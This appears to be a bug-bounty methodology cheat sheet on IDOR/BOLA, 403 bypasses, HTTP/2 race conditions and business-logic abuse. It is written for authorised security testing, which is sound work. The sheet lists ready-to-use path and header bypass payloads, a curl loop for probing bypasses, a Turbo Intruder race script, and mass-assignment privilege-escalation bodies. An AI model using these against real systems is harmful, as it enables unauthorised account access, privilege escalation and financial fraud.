---
title: "IDOR, BOLA, 403 Bypass & Race Conditions"
description: "Broken object level authorization, status code and path bypasses, HTTP/2 single-packet race conditions, and business logic abuse"
tags:
  - Bug Bounty
  - IDOR
  - BOLA
  - 403 Bypass
  - Race Condition
  - Business Logic
---

# IDOR / BOLA, 403 Bypass & Race Conditions

---

## 1. IDOR / BOLA Hunting Methodology

**IDOR = every identifier your session can *reference*, but should not *control*.** Map every object reference and test it with two accounts.

=== " Enumeration Checklist"

    ```text
    - Numeric IDs : /api/v1/invoice/1001 -> 1002, 1000, 999
    - UUID v1 (timestamp) : uuid v1 leaks MAC + time -> predict/bruteforce nearby UUIDs
    - UUID v4 : not guessable -> but check for UUID LEAKS (shared links, emails,
                               exports, invite links, PDF metadata, CSV exports)
    - Base64 "IDs" : eyJpZCI6MTMzN30= -> decode -> {"id":1337} -> tamper -> re-encode
    - Hashed IDs : MD5(user_id) -> crack, or look for bcrypt/CRC32 weak patterns
    - GraphQL node(id:) : base64("User:1337") -> decode + modify
    - Slug / username : /profile/john -> /profile/admin
    - Nested object IDs : {"org_id":1,"user_id":999} -> change only the SECOND one
    - Bulk endpoints : POST /api/users/bulk ["1","2","3"] -> add victim's ID
    - Exports / reports : /export?user_id=<VICTIM> (often missing the same check)
    - Multi-tenant headers : X-Org-Id: 1, X-Tenant: acme, X-Company-ID
    - HTTP methods : PATCH/PUT/DELETE may bypass the GET-only authz check
    - Response diffing : Compare 200 vs 403 vs 404 bodies for user objects.
    ```

=== " Parameter Pollution & Format Confusion"

    ```http
    GET /api/v1/users/1337/profile HTTP/1.1
    Host: <DOMAIN>
    X-Original-User-Id: <YOUR_ID>
    X-User-Id: <YOUR_ID>
    # Duplicate parameters -> server picks first, authz middleware checks last
    ?user_id=<YOUR_ID>&user_id=<VICTIM_ID>
    ?user_id=<VICTIM_ID>&user_id=<YOUR_ID>
    {"user_id": <YOUR_ID>, "user_id": <VICTIM_ID>} # JSON duplicate key
    # Array / object confusion
    {"user_id": [<YOUR_ID>, <VICTIM_ID>]}
    {"user_id": {"id": <VICTIM_ID>}}
    ?user_id[]=<VICTIM_ID>
    # Wildcard / filter abuse
    ?user_id=* | ?user_id=all | ?user_id= | ?user_id=null | ?user_id=0
    ```

---

## 2. 403 / 401 Authorization Bypass Techniques

When you hit `403 Forbidden` on `/admin` or an internal API, don't give up — try these systematically (inspired by HowToHunt's **403 Bypass**):

```bash
# Path-based obfuscation: the single most effective family
/admin -> /admin/ -> //admin -> /admin//
/admin -> /./admin -> /admin/. -> /admin%20
/admin -> /admin%09 -> /admin%00 -> /admin..
/admin -> /%2fadmin -> /admin%2f -> /admin;/
/admin -> /Admin -> /ADMIN -> /aDmIn
/admin -> /admin.json -> /admin.html -> /admin.php
/admin -> /..;/admin -> /.;/admin -> /%252fadmin
/api/v1/users -> /api/v1/Users -> /api/v1/users/. -> /api/v1/users%20
# Header-based bypass (front-end allows, back-end trusts these)
X-Original-URL: /admin
X-Rewrite-URL: /admin
X-Forwarded-For: 127.0.0.1
X-Forwarded-For: 127.0.0.1, 127.0.0.1
X-Real-IP: 127.0.0.1
X-Originating-IP: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Client-IP: 127.0.0.1
X-Host: 127.0.0.1
X-Custom-IP-Authorization: 127.0.0.1
Referer: https://<DOMAIN>/admin
# Method tampering (authz sometimes only bound to GET/POST handlers)
curl -X POST / PUT / PATCH / DELETE / TRACE / OPTIONS / FOOBAR https://<DOMAIN>/admin
# Content-type swap
Content-Type: application/x-www-form-urlencoded -> application/json -> text/plain
```

```bash
# Automate the whole 403-bypass suite with a script (Kathan-style bypass list)
for p in "/.%2f" "/%2e/" "//" "/./" "/;/" "/%09" "/%00" "/..;/" "/%2e%2e/" ; do
  code=$(curl -s -o /dev/null -w "%{http_code}" "https://<DOMAIN>${p}admin")
  echo "[$code] https://<DOMAIN>${p}admin"
done
```

---

## 3. Race Conditions (Limit Overrun & TOCTOU)

=== " HTTP/2 Single-Packet Attack"

    ```python
    # Turbo Intruder: send 30 parallel requests in ONE TCP packet (kills network jitter)
    # Use this for: coupon reuse, gift-card redemption, withdrawal limits, voting,
    # username registration, 2FA attempt counters, referral bonuses, invitation limits.

    def queueRequests(target, wordlists):
        engine = RequestEngine(endpoint='https://<DOMAIN>',
                               concurrentConnections=1,
                               engine=Engine.BURP2,
                               requestsPerConnection=100)
        # 1. Warm-up request (triggers connection + session setup)
        engine.queue(target.req, gate='warmup')
        for i in range(30):
            engine.queue(target.req, target.baseInput, gate='race')
        engine.openGate('warmup')
        engine.openGate('race')

    def handleResponse(req, interesting):
        table.add(req)
    ```

=== " High-Value Race Targets"

    ```text
    - Redeem coupon / promo code N times (limit bypass)
    - Withdraw balance / transfer funds exceeding available amount (negative balance)
    - Add the same item multiple times to a cart with a single-use discount
    - Register username before the uniqueness check completes (account squatting)
    - Bypass "one free trial per user" by firing parallel subscription requests
    - Exceed API quota / OTP attempt counters
    - Multiple "invite member" calls exceeding the seat limit
    - File upload + processing race (upload a file, then race the antivirus scan)
    - Two-step verification race: verify AND change email simultaneously
    ```

---

## 4. Business Logic & Mass Assignment

```bash
# Mass Assignment: add fields the app never displays in the UI
POST /api/v1/register
{"email":"a@b.com","password":"x","role":"admin","is_admin":true,"verified":true,
 "balance":1000000,"org_id":1,"subscription":"enterprise","is_staff":true}
# PATCH-based privilege escalation
PATCH /api/v1/users/me
{"role":"superadmin","permissions":["*"]}
# Try the classic property list on every object you touch
# role, roles, admin, is_admin, isAdmin, user_type, account_type, plan, tier,
# verified, email_verified, active, status, credits, balance, org_id, tenant_id,
# permissions, scopes, group, groups, mfa_enabled, password_reset_required
# Business logic classics
- Negative quantity: {"qty":-1, "price":100} -> credit instead of debit
- Currency confusion: pay in TRY, receive in USD
- Decimal rounding: send 0.0001 units 10,000 times
- Skip payment step entirely (multi-step checkout -> jump to /confirm)
- Coupon stacking, self-referral, gift-card brute force (check rate limiting!)
- Trial abuse: cancel -> re-register with +alias@email, or change email after trial
- Refund abuse: refund to a different account than the purchaser
- Feature flag flipping: ?beta=true, X-Feature-Flags: all
```